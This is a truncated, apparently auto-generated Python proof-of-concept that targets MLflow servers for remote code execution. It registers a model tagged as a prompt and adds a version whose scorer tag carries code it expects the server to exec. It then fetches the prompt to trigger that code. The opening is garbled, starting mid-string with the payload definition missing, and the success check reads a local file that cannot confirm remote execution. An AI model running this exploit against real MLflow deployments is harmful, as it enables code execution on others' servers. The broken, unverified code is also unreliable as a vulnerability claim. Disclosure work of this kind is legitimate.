#!/usr/bin/env python3
# PoC for mlflow (/tmp/bounty_test/mlflow/mlflow)
# Path: rce-018
# Auto-generated — run with: python3 mlflow-rce-018-poc.py
#
{target_host}/api/2.0/mlflow/registered-models/create"
    model_data = {
        "name": prompt_name,
        "tags": [{"key": "mlflow.prompt", "value": "true"}]
    }
    try:
        r = requests.post(create_model_url, json=model_data, timeout=10)
        if r.status_code != 200:
            print(f"[-] Failed to create registered model: {r.text}")
            sys.exit(1)
        print(f"[+] Created registered model: {prompt_name}")
    except Exception as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)
    
    # Create model version with malicious scorer tag
    create_version_url = f"{target_host}/api/2.0/mlflow/model-versions/create"
    # The scorer serialization format: we need to provide a JSON that will be deserialized
    # into a ScorerSerialized object. The call_source field will be exec'd.
    # We'll craft a minimal scorer serialization.
    scorer_serialized = {
        "original_func_name": "my_scorer",
        "call_signature": "(x)",
        "call_source": f"result = {payload}",
        "name": "poc_scorer",
        "description": "",
        "aggregations": [],
        "mlflow_version": "2.10.0",
        "serialization_version": "1"
    }
    version_data = {
        "name": prompt_name,
        "source": "dummy",
        "tags": [
            {"key": "mlflow.prompt", "value": "true"},
            {"key": "mlflow.scorer", "value": json.dumps(scorer_serialized)}
        ]
    }
    try:
        r = requests.post(create_version_url, json=version_data, timeout=10)
        if r.status_code != 200:
            print(f"[-] Failed to create model version: {r.text}")
            sys.exit(1)
        version = r.json()["model_version"]["version"]
        print(f"[+] Created model version: {version}")
    except Exception as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)
    
    # Step 3: Load the prompt to trigger the vulnerability
    # The loading endpoint will deserialize the scorer and execute the payload.
    load_url = f"{target_host}/api/2.0/mlflow/prompts/get"
    params = {"name": prompt_name, "version": version}
    try:
        r = requests.get(load_url, params=params, timeout=10)
        if r.status_code == 200:
            print(f"[+] Prompt loaded successfully. Payload should have executed.")
        else:
            print(f"[-] Failed to load prompt: {r.text}")
    except Exception as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)
    
    # Verify payload execution (optional)
    import os
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] Payload executed: /tmp/poc_success.txt created")
    else:
        print("[*] Payload may have executed but file not found (check server)")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_HOST = sys.argv[1]
    exploit(TARGET_HOST, PAYLOAD)
